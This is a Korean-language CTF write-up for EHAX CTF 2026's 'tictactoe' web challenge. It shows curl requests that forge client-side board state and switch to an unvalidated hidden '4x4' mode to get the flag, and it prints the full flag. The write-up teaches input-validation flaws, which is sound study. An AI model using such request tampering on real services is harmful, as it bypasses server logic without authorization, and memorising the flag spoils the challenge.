---
title: "[Web] tictactoe"
description: Writeup for "tictactoe" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Web]
toc: true
comments: false
---

# tictactoe (EHAX CTF 2026)

---

- **Name:** tictactoe
- **Category:** Web
- **Description:** The NEURAL-LINK CORE v4.4 is online, and its logic is absolute. If you want the flag, you'll have to break the protocol, not just the game.
- **Difficulty:** ★★☆☆☆ (141 points, 135 solves / 887 teams)
- **Connection:** `https://ctf-challenge-1-beige.vercel.app`
- **Flag format:** `EH4X{...}`

---

### 개요

틱택토 게임입니다.
문제 설명에 힌트가 있습니다.

> "If you want the flag, you'll have to **break the protocol**, not just the game."

게임을 이기는 것이 아니라, **프로토콜을 조작**하는 것이 목표입니다.
DevTools를 열고 Network 탭에서 한 수를 두어보면
`POST /api`로 요청이 나가는 것이 보입니다.

---

### 소스 분석

#### script.js — API 통신 확인

```bash
curl -s https://ctf-challenge-1-beige.vercel.app/script.js
```

핵심 함수를 찾아봅니다.

```js
async function syncWithCore() {
    const response = await fetch('/api', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mode: "3x3", state: board })
    });
    const data = await response.json();

    if (data.flag) {
        status.innerHTML = `...${data.flag}...`;
    }
}
```

클라이언트가 `mode`와 `state`를 직접 조립해서 보냅니다.
`data.flag`가 있으면 화면에 출력됩니다.

`state`는 `1`(플레이어), `-1`(AI), `0`(빈 칸)으로 구성된 배열입니다.
클라이언트 측에는 아무 보호가 없으므로,
원하는 보드 상태를 직접 서버로 보낼 수 있습니다.

---

### 취약점 분석

#### 3x3 모드 — 치트 감지 있음

이긴 상태의 보드를 직접 보내봅니다.

```bash
curl -s -X POST "https://ctf-challenge-1-beige.vercel.app/api" \
  -H "Content-Type: application/json" \
  -d '{"mode":"3x3","state":[[1,1,1],[0,-1,0],[-1,0,0]]}'
```

응답:

```json
{
  "message": "AI: I've simulated this 3x3 grid 10^6 times. You don't win in any of them."
}
```

서버가 불가능한 보드 상태를 감지하고 거부합니다.

무승부 상태를 보내면 이런 응답이 옵니다.

```json
{
  "message": "AI: DRAW... Perhaps you should inspect the headers of your reality.",
  "gameOver": true
}
```

`"inspect the headers of your reality"` — 요청 구조를 살펴보라는 힌트입니다.
HTTP 헤더를 이것저것 바꿔봐도 변화가 없습니다.
시선을 `mode` 필드로 돌려봅니다.

#### 4x4 모드 — 치트 감지 없음

`mode`를 `"4x4"`로 바꿔봅니다.

```bash
curl -s -X POST "https://ctf-challenge-1-beige.vercel.app/api" \
  -H "Content-Type: application/json" \
  -d '{"mode":"4x4","state":[[1,1,1,1],[-1,-1,0,0],[0,0,0,0],[0,0,0,0]]}'
```

응답:

```json
{
  "message": "4x4_MODE_ACTIVE: AI sensors blind in ghost sectors."
}
```

**"AI sensors blind"** — 4x4 모드에는 치트 감지 로직이 없습니다.
서버에 숨겨진 모드가 있고, 그 경로에는 검증이 빠져 있습니다.

| 모드 | 치트 감지 | 보드 검증 |
|------|----------|----------|
| `3x3` | ✅ 있음 | ✅ 있음 |
| `4x4` | ❌ 없음 | ❌ 없음 |

---

### Exploit 실행 과정

4x4 모드에서 X로 가득 찬 불가능한 보드를 보냅니다.

```bash
curl -s -X POST "https://ctf-challenge-1-beige.vercel.app/api" \
  -H "Content-Type: application/json" \
  -d '{"mode":"4x4","state":[[1,1,1,1],[1,1,1,1],[1,1,1,1],[1,1,1,1]]}'
```

실행 결과:

```json
{
  "message": "AI: Protocol bypassed... You didn't just play the game; you rewrote the rules.",
  "flag": "EH4X{D1M3NS1ONAL_GHOST_1N_TH3_SH3LL}"
}
```

---

### FLAG

```
EH4X{D1M3NS1ONAL_GHOST_1N_TH3_SH3LL}
```

---

### 요약

이 문제의 핵심은 **일관성 없는 입력 검증**입니다.

`3x3` 모드에는 치트 감지가 있지만,
숨겨진 `4x4` 모드에는 같은 검증이 적용되지 않았습니다.

클라이언트가 `mode` 필드를 자유롭게 바꿀 수 있고,
서버가 그 값을 그대로 신뢰하는 순간
숨겨진 경로를 통해 검증을 전부 우회할 수 있습니다.
